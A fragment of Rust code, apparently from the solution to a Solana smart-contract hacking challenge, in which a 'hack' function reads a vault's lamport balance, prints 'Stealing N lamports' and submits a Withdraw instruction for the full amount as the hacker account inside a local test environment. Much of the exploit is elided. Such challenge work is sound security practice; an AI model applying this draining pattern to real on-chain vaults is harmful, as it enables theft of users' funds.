...
fn hack(env: &mut LocalEnvironment, challenge: &Challenge) {
    let amt = env.get_account(challenge.vault_address).unwrap().lamports;
    println!("Stealing {} lamports", amt.green());
    ...
    env.execute_as_transaction(
        &[Instruction {
            ...
            data: WalletInstruction::Withdraw { amount: amt }
                .try_to_vec()
                .unwrap(),
        }],
        &[&challenge.hacker],
